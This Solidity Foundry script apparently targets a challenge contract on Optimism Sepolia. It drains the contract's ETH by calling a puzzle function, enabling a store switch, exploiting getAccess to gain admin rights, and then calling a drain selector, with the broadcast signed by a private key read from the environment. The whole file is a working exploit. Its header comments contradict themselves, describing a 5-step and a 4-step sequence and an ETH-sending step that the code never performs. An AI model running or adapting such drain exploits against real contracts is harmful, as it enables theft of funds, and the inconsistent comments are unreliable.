// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * @title Final DrainVault Attack Script (Corrected 5-Step Strategy)
 * @dev This script executes the full 4-step attack sequence required to drain the vault.
 * The contract has a global lock that must be disabled by first sending it ETH.
 *
 * Attack Steps:

 * 1. Call the puzzle function `0x3a279611` with `[1,2,3,6]` to enable the `store` function.
 * 2. Call `store("status", 1)` to activate the admin and drain mechanisms.
 * 3. Call `getAccess(0)` to exploit a logical flaw and gain admin privileges.
 * 4. As an admin, call the `0xb70b232d` drain function.
 *
 * Target Contract: 0xEF8433eC69ACc8B58522cDbbB899172ae62af4AC
 * Network: Optimism Sepolia
 */
contract FinalDrainScript is Script {
    address constant TARGET_CONTRACT = 0xEF8433eC69ACc8B58522cDbbB899172ae62af4AC;

    // Function selectors from decompiled code
    bytes4 constant PUZZLE_SELECTOR = 0x3a279611;
    bytes4 constant STORE_SELECTOR = 0x7408a1d7;
    bytes4 constant GET_ACCESS_SELECTOR = 0x2fc82012;
    bytes4 constant DRAIN_SELECTOR = 0xb70b232d;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(deployerPrivateKey);

        console.log("=== Final Drain Vault Attack (5-Step Strategy) ===");
        console.log("Target Contract:", TARGET_CONTRACT);
        console.log("Attacker Address:", attacker);

        uint256 initialBalance = TARGET_CONTRACT.balance;
        console.log("Initial Contract Balance:", initialBalance, "wei");

        if (initialBalance == 0) {
            console.log("Contract is already empty. Exiting.");
            return;
        }

        vm.startBroadcast(deployerPrivateKey);


        // --- Step 1: Solve the puzzle to enable the store function ---
        console.log("Step 1: Calling puzzle function to enable store...");
        uint256[] memory puzzleInput = new uint256[](4);
        puzzleInput[0] = 1;
        puzzleInput[1] = 2;
        puzzleInput[2] = 3; // 1 + 2 = 3
        puzzleInput[3] = 6; // 3 * 2 = 6
        
        (bool puzzleSuccess, ) = TARGET_CONTRACT.call(
            abi.encodeWithSelector(PUZZLE_SELECTOR, puzzleInput)
        );
        require(puzzleSuccess, "Failed to call puzzle function.");
        console.log("-> Puzzle function called successfully.");

        // --- Step 2: Call store() to activate the contract ---
        console.log("Step 2: Calling store('status', 1) to activate drain mechanism...");
        (bool storeSuccess, ) = TARGET_CONTRACT.call(
            abi.encodeWithSelector(STORE_SELECTOR, "status", uint256(1))
        );
        require(storeSuccess, "Failed to call store function.");
        console.log("-> Drain mechanism activated successfully.");

        // --- Step 3: Exploit getAccess to gain admin privileges ---
        console.log("Step 3: Calling getAccess(0) to gain admin rights...");
        (bool accessSuccess, ) = TARGET_CONTRACT.call(
            abi.encodeWithSelector(GET_ACCESS_SELECTOR, uint256(0))
        );
        require(accessSuccess, "Failed to call getAccess function.");
        console.log("-> Admin rights granted successfully.");

        // --- Step 4: Call the drain function as an admin ---
        console.log("Step 4: Calling drain function as admin...");
        (bool drainSuccess, ) = TARGET_CONTRACT.call(
            abi.encodeWithSelector(DRAIN_SELECTOR)
        );
        require(drainSuccess, "Drain function call failed.");
        console.log("-> Drain function executed successfully!");

        vm.stopBroadcast();

        // --- Verification ---
        uint256 finalBalance = TARGET_CONTRACT.balance;
        console.log("\n--- Verification ---");
        console.log("Final Contract Balance:", finalBalance, "wei");

        if (finalBalance == 0) {
            console.log(" SUCCESS: The contract has been completely drained!");
        } else {
            console.log(" FAILED: The contract still has funds.");
        }
    }
}
